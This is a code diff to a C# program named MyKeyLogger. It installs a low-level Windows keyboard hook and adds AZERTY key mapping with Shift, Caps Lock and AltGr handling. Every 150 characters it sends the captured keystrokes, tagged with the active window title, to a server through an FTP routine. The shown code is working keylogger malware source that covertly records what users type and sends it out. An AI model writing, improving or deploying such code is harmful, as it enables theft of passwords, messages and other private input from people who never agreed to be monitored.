@@ -2,10 +2,14 @@
 // https://docs.microsoft.com/fr-fr/windows/win32/winmsg/hooks?redirectedfrom=MSDN
 
 using System;
+using System.Collections.Generic;
+using System.ComponentModel;
 using System.Drawing;
 using System.Diagnostics;
+using System.Linq;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
+using Microsoft.Win32.SafeHandles;
 
 namespace MyKeyLogger
 {
@@ -17,7 +21,68 @@ namespace MyKeyLogger
 		}
 	
 		private static string data = DateTime.Now.ToString("dd/MM/yyyy HH:mm : ");
-		
+		private static Dictionary<int, string> LayoutAzerty = new Dictionary<int, string>
+		{
+			{49, "&"},
+			{50, "é"},
+			{51, "\""},
+			{52, "'"},
+			{53, "("},
+			{54, "-"},
+			{55, "è"},
+			{56, "_"},
+			{57, "ç"},
+			{48, "à"},
+			{219, ")"},
+			{187, "="},
+			{222, "²"},
+			{188, ","},
+			{190, ";"},
+			{191, ":"},
+			{223, "!"},
+			{186, "$"},
+			{192, "ù"},
+			{220, "*"},
+			{221, "^"},
+			{1049, "1"},
+			{1050, "2"},
+			{1051, "3"},
+			{1052, "4"},
+			{1053, "5"},
+			{1054, "6"},
+			{1055, "7"},
+			{1056, "8"},
+			{1057, "9"},
+			{1048, "0"},
+			{1219, "°"},
+			{1187, "+"},
+			{1188, "?"},
+			{1190, "."},
+			{1191, "/"},
+			{1223, "§"},
+			{1186, "£"},
+			{1192, "%"},
+			{1220, "µ"},
+			{1221, "¨"},
+			{3050, "~"},
+			{3051, "#"},
+			{3052, "{"},
+			{3053, "["},
+			{3054, "|"},
+			{3055, "`"},
+			{3056, "\\"},
+			{3057, "^"},
+			{3048, "@"},
+			{3219, "]"},
+			{3187, "}"},
+			{226, "<"},
+			{1226, ">"},
+			{3186, "¤"},
+			{3069, "€"},
+			{32, " "}
+		};
+
+		private static int[] IgnoredKey = {160, 162, 163, 164, 20, 165};
 		// 
 		private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
@@ -26,6 +91,7 @@ namespace MyKeyLogger
 	
         //  
         private static bool CapsLock = false;
+        private static bool Caps = false;
         private static bool LControl = false;
         private static bool LMenu = false;
         private static bool RMenu = false;   
@@ -85,32 +151,80 @@ namespace MyKeyLogger
         
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-        	
-        	int myASCIIKey = Marshal.ReadInt32(lParam);
-        	// Console.WriteLine((Keys)myASCIIKey);
-        	var myKey = Enum.GetName(typeof(Keys), myASCIIKey);
-			 //Console.WriteLine(myKey);
-        	
-			 
-			 if (data.Length < 150)
-			 {
-			 	if (wParam == (IntPtr)WM_KEYDOWN){
-				 	data = data + myKey;
-				 	Console.WriteLine(data.Length);
-				 }
-			 }
-			 else
-			 {
-			 	data = data + "\n";
-		 		ServerFTP.ConnectionServer(data);
-		 		data =  DateTime.Now.ToString("dd/MM/yyyy HH:mm : ") + ActiveWindows.NomDeLaFenetre() + " : ";
-			 }
+				int myASCIIKey = Marshal.ReadInt32(lParam);
+		        Console.WriteLine(myASCIIKey);
+		        CapsLock = Console.CapsLock;
+		        var modif = Control.ModifierKeys;
+		        //Console.WriteLine(modif);
+		        Caps = (modif == Keys.Shift);
+		        //Console.WriteLine((Keys)myASCIIKey);
+		        var myKey = Enum.GetName(typeof(Keys), myASCIIKey);
+		        //Console.WriteLine(myKey);
+		        //Console.WriteLine(myKey);
+		        //Console.WriteLine(wParam);
 
-            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+		        if (wParam == (IntPtr) WM_KEYDOWN || wParam == (IntPtr) WM_SYSKEYDOWN)
+			        {
+				        string val = "";
+				        if (myASCIIKey > 64 && myASCIIKey < 91 && (modif == Keys.None || modif == Keys.Shift))
+				        {
+					        if (Caps ^ CapsLock)
+					        {
+						        val = myKey;
+					        }
+					        else
+					        {
+						        val = myKey.ToLower();
+					        }
+				        } else
+				        {
+					        if ((Caps ^ CapsLock) && (modif == Keys.None || modif == Keys.Shift) && !IgnoredKey.Contains(myASCIIKey))
+						        myASCIIKey += 1000;
+					        if (modif == (Keys.Control | Keys.Alt))
+						        myASCIIKey += 3000;
+
+
+					        if (LayoutAzerty.ContainsKey(myASCIIKey) && (modif == Keys.None || modif == Keys.Shift || modif == (Keys.Control | Keys.Alt)))
+					        {
+						        val = LayoutAzerty[myASCIIKey];
+					        }
+					        else if (myASCIIKey < 1000 && LayoutAzerty.ContainsKey(myASCIIKey))
+					        {
+						        val = "`" + modif + "+" + LayoutAzerty[myASCIIKey] + "`";
+					        }
+					        else if (!IgnoredKey.Contains(myASCIIKey))
+					        {
+						        if (modif == Keys.None)
+						        {
+							        val = "`" + myKey + "`";
+						        }
+						        else
+						        {
+							        val = "`" + modif + "+" + myKey + "`";
+						        }
+					        }
+				        }
+				        Console.WriteLine(val);
+				        if (val != "" && "\\`".Contains(val))
+					        val = "\\" + val;
+				        data = data + val;
+				        Console.WriteLine(data.Length);
+			        }
+		        if (data.Length > 150)
+				{
+
+			        data = data + "\n";
+			        ServerFTP.ConnectionServer(data);
+			        data = DateTime.Now.ToString("dd/MM/yyyy HH:mm") + "\\:\\" + ActiveWindows.NomDeLaFenetre() + "\\:\\";
+		        }
+
+
+	        return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
         
         public static void Start()
         {        	
+	        data = DateTime.Now.ToString("dd/MM/yyyy HH:mm") + "\\:\\" + ActiveWindows.NomDeLaFenetre() + "\\:\\";
         	var handle = GetConsoleWindow();
             _hookID = SetHook(_proc);
             Application.Run();
